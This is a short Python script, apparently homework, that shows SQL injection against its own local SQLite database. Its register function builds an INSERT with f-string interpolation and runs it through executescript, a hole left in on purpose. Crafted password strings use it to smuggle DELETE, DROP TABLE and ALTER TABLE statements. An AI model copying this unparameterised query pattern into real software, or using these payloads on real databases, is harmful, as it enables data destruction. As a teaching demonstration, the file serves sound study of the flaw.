import sqlite3


def create_table() -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS `table_users` "
                       "(username text, password text)")
        conn.commit()


def register(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(f"""
        INSERT INTO `table_users` (username, password) 
        VALUES ('{username}', '{password}')
        """)
        conn.commit()


def delete_hack() -> None:
    username: str = "I like"
    password: str = "SQL Injection'); DELETE FROM table_users; --"
    register(username, password)


def drop_hack() -> None:
    username: str = "I like"
    password: str = "SQL Injection'); DROP TABLE IF EXISTS table_users; --"
    register(username, password)


def alter_hack(number: int) -> None:
    username: str = "I like"
    password: str = (f"SQL Injection'); ALTER TABLE table_users ADD COLUMN "
                     f"my_very_bad_column{number} text; --")
    register(username, password)


if __name__ == '__main__':
    create_table()
    register('wignorbo', 'sjkadnkjasdnui31jkdwq')
    [alter_hack(i) for i in range(5)]
    delete_hack()
    drop_hack()
